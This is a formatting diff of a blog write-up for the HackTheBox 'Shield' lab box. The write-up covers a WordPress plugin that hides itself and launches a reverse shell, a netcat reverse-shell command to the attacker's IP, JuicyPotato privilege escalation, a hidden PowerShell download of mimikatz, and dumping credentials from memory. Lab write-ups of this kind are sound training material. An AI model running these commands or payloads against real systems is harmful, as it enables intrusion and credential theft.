@@ -1,37 +1,32 @@
-## HTB Starting Point: Shield
+---
+title: "HTB Starting Point: Shield"
+seoTitle: "HackTheBox Starting Point: Shield"
+seoDescription: "Complete write-up for Shield hacking box from HackTheBox with additional comments and educational materials."
+datePublished: Mon Jul 12 2021 22:00:00 GMT+0000 (Coordinated Universal Time)
+cuid: ckpw4t5zj0cxkzls1cbv61dhe
+slug: htb-starting-point-shield
+cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1623449282190/khIkZvWKK.png
+ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1623449334603/PRSaM2Nxz.png
+tags: hacking, cybersecurity-1
 
-`Shield` is a 4th box from Starting Point path on [HackTheBox.eu](https://app.hackthebox.eu). This path is composed of 9 boxes in a way that later boxes use information (in a form of credentials) gathered from the previous ones.
+---
+
+`Shield` is a 4th box from Starting Point path on [HackTheBox Starting Point - Tier 2](https://affiliate.hackthebox.com/cybeth-htbstart). This path is composed of 9 boxes in a way that later boxes use information (in a form of credentials) gathered from the previous ones.
 
 This box features only a root flag. Don't waste your time on finding the `user.txt` - until this is corrected by the Dev Team. I've raised this issue already, so this article will be updated accordingly when status is changed. UPDATE: Apparently this is solved right now and information "No Flag" for user flag is shown correctly both for `Shield` and `Vaccine`.
 
-***
-# Contents
-
-1. [Basic Information](#basic-information)
-2. [Target of Evaluation](#target-of-evaluation)
-3. [Recon](#recon)
-4. [WordPress Admin Panel Access](#wordpress-admin-panel-access)
-5. [Weaponize](#weaponize)
-6. [Exploiting Low Privilege Shell Access](#exploiting-low-privilege-shell-access)
-7. [Vulnerability Scanning](#vulnerability-scanning)
-8. [Exploiting](#exploiting)
-9. [Post-exploitation](#post-exploitation)
-10. [Cleanup](#cleanup)
-11. [Additional Readings](#additional-readings)
-***
-
 # Basic Information
 
-| #     |   |
-|:--    |:--|
-| Type    | Starting Point
-|Name    | **Hack The Box / Shield**
-|Pwned | 2021/06/03
-|URLs    | https://app.hackthebox.eu/machines/290
-|Author  | **Asentinn** / OkabeRintaro
-|       | [https://ctftime.org/team/152207](https://ctftime.org/team/152207)
+| # |  |
+| --- | --- |
+| Type | Starting Point |
+| Name | **Hack The Box / Shield** |
+| Pwned | 2021/06/03 |
+| URLs | [Starting Point - Tier 2](https://affiliate.hackthebox.com/cybeth-htbstart) |
+| Author | **Asentinn** / OkabeRintaro |
+|  | [https://ctftime.org/team/152207](https://ctftime.org/team/152207) |
 
-%%[patreon-btn]
+%%[patreon-btn] 
 
 # Target of Evaluation
 
@@ -68,16 +63,17 @@ $ mysql -h 10.10.10.29
 ERROR 1130 (HY000): Host '10.10.XX.XXX' is not allowed to connect to this MySQL server
 ```
 
-Oh, so that's what _unauthorized_ from `nmap` scan meant.
+Oh, so that's what *unauthorized* from `nmap` scan meant.
 
 Grabbing hosting data from HTTP headers (just in case):
 
-```
+```plaintext
 Server: Microsoft-IIS/10.0
 X-Powered-By: PHP/7.1.29
 ```
 
 Web directory enumeration:
+
 ```txt
 $ gobuster dir -w /usr/wl/dirbuster-m.txt -x txt,php -u http://10.10.10.29
 ===============================================================
@@ -108,16 +104,15 @@ It is a WordPress installation, so after a while with no other paths pop up, I'm
 
 [Back to top](#contents) ⤴
 
-# WordPress Admin panel access 
+# WordPress Admin panel access
 
-
-![WordPress landing page](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251101474/unPjJjvzE.png)
+![WordPress landing page](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251101474/unPjJjvzE.png align="left")
 
 ## `/wp-login.php`
 
 I'm trying the known so far usernames and password from the previous boxes: `admin/P@s5w0rd!` lets me in.
 
-It looks just like basic WP installation without internet access (errors from update feature and no plugin store). 
+It looks just like basic WP installation without internet access (errors from update feature and no plugin store).
 
 [Back to top](#contents) ⤴
 
@@ -125,7 +120,7 @@ It looks just like basic WP installation without internet access (errors from up
 
 To get access to the web server I'm going to upload a payload with `netcat` binary and PHP file that establish reverse shell to my host.
 
-### pshield_plugin.php
+### pshield\_plugin.php
 
 > This code hides plugin on the admin panel so it won't be easy tracked by other hackers
 
@@ -157,7 +152,7 @@ To get access to the web server I'm going to upload a payload with `netcat` bina
 ?>
 ```
 
-### wp_config.php
+### wp\_config.php
 
 > Executes reverse PowerShell
 
@@ -169,10 +164,9 @@ To get access to the web server I'm going to upload a payload with `netcat` bina
 ?>
 ```
 
-### wp_cleanup.php
+### wp\_cleanup.php
 
-> Allows to remotely delete the contents of the plugin, leaving only the main plugin file with the dummy data.
-> This way if you want to update the payload, call this file and then deactivate and remove Example plugin.
+> Allows to remotely delete the contents of the plugin, leaving only the main plugin file with the dummy data. This way if you want to update the payload, call this file and then deactivate and remove Example plugin.
 
 ```php
 # wp_cleanup.php
@@ -188,17 +182,16 @@ unlink(__FILE__);
 ?>
 ```
 
-### pshield_plugin.zip
+### pshield\_plugin.zip
 
 > Plugin archive ready for upload
 
-```
+```plaintext
 $ zip pshield_plugin.zip *
   adding: nc342as.exe (deflated 53%)
   adding: pshield_plugin.php (deflated 45%)
   adding: wp_cleanup.php (deflated 38%)
   adding: wp_config.php (deflated 6%)
-
 ```
 
 [Back to top](#contents) ⤴
@@ -213,14 +206,13 @@ After uploading the plugin and activating it, each time I want to get the PS rev
 
 Also, as you can see - plugin is not visible. The only thing that reveals it is running is a number of visible plugins in comparison to All number on GUI.
 
-
-![201644566290.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251171589/0tDJKU9YA.png)
+![201644566290.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251171589/0tDJKU9YA.png align="left")
 
 ## Reverse shell (low privilege)
 
 Trying to get database connection details from `wp-config.php`:
 
-```
+```plaintext
 PS C:\inetpub\wwwroot\wordpress> cat wp-config.php
 
 <?php
@@ -247,12 +239,14 @@ define('DB_CHARSET', 'utf8');
 define('DB_COLLATE', '');
 
 // ...
-
 ```
 
 Copied for later use:
+
 * Database: `wordpress124`
+    
 * Credentials: `wordpressuser124/P_-U9dA6q.B|`
+    
 
 ## Database enumeration
 
@@ -265,7 +259,7 @@ ID	user_login	user_pass	user_nicename	user_email	user_url	user_registered	user_a
 1	admin	$P$Bgz58wVx7mKpwW3AcNv6VNstbMeyQ30	admin	shield@hackthebox.eu		2020-02-04 15:40:47	1622581404:$P$BrWeD9Vdxf2/vtWQsEO7hJAlOAGkMQ0	0	admin
 ```
 
-With a help of [WP Sec resource](https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/)  I'm trying to guess the password stored in `pass.hash` using `rockyou` wordlist:
+With a help of [WP Sec resource](https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/) I'm trying to guess the password stored in `pass.hash` using `rockyou` wordlist:
 
 ```sh
 $ hashcat -O -m 400 -a 0 -o pass.txt pass.hash /usr/wl/rockyou.txt
@@ -275,7 +269,7 @@ Meanwhile, I'm dumping data from other tables, but nothing useful come up.
 
 In a gesture of resignation I'm downloading the [winPEAS](/linpeas) from my Python simple server.
 
-```
+```plaintext
 (New-Object System.Net.WebClient).DownloadFile('http://10.10.XX.XXX/pea3r3efr.exe','pea3r3efr.exe');
 ```
 
@@ -303,7 +297,7 @@ Some of the more interesting findings from `winPEAS`
 
 ## Host details
 
-```
+```plaintext
 Hostname: Shield
     Domain Name: MEGACORP.LOCAL
     ProductName: Windows Server 2016 Standard
@@ -322,16 +316,18 @@ Hostname: Shield
     HighIntegrity: False
     PartOfDomain: True
     Hotfixes:
-
 ```
 
 ## LSA and credentials
 
 * [Hacktricks - LSA Protection](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection)
+    
 * [Hacktricks - Credential Guard](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard)
+    
 * [Hacktricks - Cached Credentials](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials)
+    
 
-```
+```plaintext
 [+] LAPS Settings
    [?] If installed, local administrator password is changed frequently and is restricted by ACL 
     LAPS Enabled: LAPS not installed
@@ -403,14 +399,14 @@ Hostname: Shield
   eventlog                                                                                             O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
 
   vgauth-service                                                                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
-
 ```
 
 ## Users and groups
 
 * [Hacktricks - User and Groups](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups)
+    
 
-```
+```plaintext
 Current user: IUSR
   Current groups: Everyone, Users, Console Logon, Authenticated Users, This Organization, Local
    =================================================================================================
@@ -431,17 +427,18 @@ Current user: IUSR
 ## Token manipulation
 
 * [Hacktricks - Token Manipulation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation)
+    
 
+![3866525911244.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251198796/qbilIKloK.png align="left")
 
-![3866525911244.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251198796/qbilIKloK.png)
-
-![3276092796401.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251207942/kFOB0QoEy.png)
+![3276092796401.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251207942/kFOB0QoEy.png align="left")
 
 * [Hacktricks - Services](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services)
+    
 
-![5024207238878.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251222989/i9nw4dQRG.png)
+![5024207238878.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251222989/i9nw4dQRG.png align="left")
 
-```
+```plaintext
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft 
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName          
@@ -485,23 +482,23 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
     201      10     2152      15924               560   1 winlogon             
     322      21    10064      25276              2600   0 WmiPrvSE             
     250      13    10884      19484              3160   0 WmiPrvSE             
-    195      12     3124      11292              4676   0 WmiPrvSE 
-
+    195      12     3124      11292              4676   0 WmiPrvSE
 ```
 
 [Back to top](#contents) ⤴
 
-# Exploiting 
+# Exploiting
 
-One thing should raise your attention is that **SeImpersonatePrivilege** is set. This is causing a potential vulnerability that can be exploited using JuicyPotato (read more in _Additional readings_ section)
+One thing should raise your attention is that **SeImpersonatePrivilege** is set. This is causing a potential vulnerability that can be exploited using JuicyPotato (read more in *Additional readings* section)
 
-```
+```plaintext
 echo START C:\inetpub\wwwroot\wordpress\wp-content\plugins\pshield_plugin\nc342as.exe -e powershell.exe 10.10.XX.XXX 9004 > jp52345.bat
 .\jp324d.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\pshield_plugin\jp52345.bat -l 9004 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
 ```
-![3380900278873.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251252596/RzX2H0MSI.png)
 
-```
+![3380900278873.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251252596/RzX2H0MSI.png align="left")
+
+```plaintext
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 6******************************a
@@ -513,22 +510,22 @@ type root.txt
 
 Because I've got the System access and I know that future boxes can use some credentials from this one - I'm downloading the `mimikatz` to read the logged in `sandra` user.
 
-```
+```plaintext
 powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.XX.XXX/mc231.exe','mc231.exe')"
 ```
 
-![3284913879648.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251295188/eVPGYeEMk2.png)
+![3284913879648.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251295188/eVPGYeEMk2.png align="left")
 
 ## Read credentials from a memory
 
-```
+```plaintext
 mimikatz # privilege::debug
 Privilege '20' OK
 ```
 
 Useless information are truncated from below output.
 
-```
+```plaintext
 mimikatz # sekurlsa::logonpasswords
 
 // ...
@@ -562,7 +559,7 @@ SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
 //...
 ```
 
-![4471246112768.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251315581/3nfKecIUZ.png)
+![4471246112768.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251315581/3nfKecIUZ.png align="left")
 
 [Back to top](#contents) ⤴
 
@@ -570,27 +567,27 @@ SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
 
 Before `wp_cleanup.php` call
 
-![2092810927112.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251327359/n5FahK14t.png)
+![2092810927112.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251327359/n5FahK14t.png align="left")
+
 After:
 
-![3898421797298.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251341291/f_sbgkWKm.png)
+![3898421797298.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251341291/f_sbgkWKm.png align="left")
 
 > Remember to close all shells before deleting plugin from WordPress admin.
 
-![1307054891438.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251351948/mnC0rIa7D.png)
-
+![1307054891438.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251351948/mnC0rIa7D.png align="left")
 
 > Like what you see? Join the [Hashnode.com](/join) now. Things that are awesome:
 
->✔ Automatic GitHub Backup
+> ✔ Automatic GitHub Backup
 
->✔ Write in Markdown
+> ✔ Write in Markdown
 
->✔ Free domain mapping
+> ✔ Free domain mapping
 
->✔ CDN hosted images
+> ✔ CDN hosted images
 
->✔ Free in-built newsletter service
+> ✔ Free in-built newsletter service
 
 > By using my link you can help me unlock the ambasador role, which cost you nothing and gives me some additional features to support my content creation mojo.
 
@@ -604,14 +601,19 @@ After:
 
 > 👉 LinkedIn: [Kamil Gierach-Pacanek](https://www.linkedin.com/in/kamilpacanek/)
 
-> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)
+> 👉 Twitter: [@cyberethical\_me](https://twitter.com/cyberethical_me)
 
 > 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)
 
 * [Impersonating Privileges with Juicy Potato by Nairuz Abulhul](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505)
+    
 * [CLIDs: Windows Server 2016 Standard](http://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/)
+    
 * [Hacktricks - Privilege Escalation Abusing Tokens](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
+    
 * [What is mimikatz](https://www.varonis.com/blog/what-is-mimikatz/)
+    
 * [Mimikatz and Active Directory Kerberos Attacks](https://adsecurity.org/?p=556)
+    
 
 #### Check other write-ups from the Starting Point path - links below the article, or navigate directly to the series [here](/series/htb-starting-point).
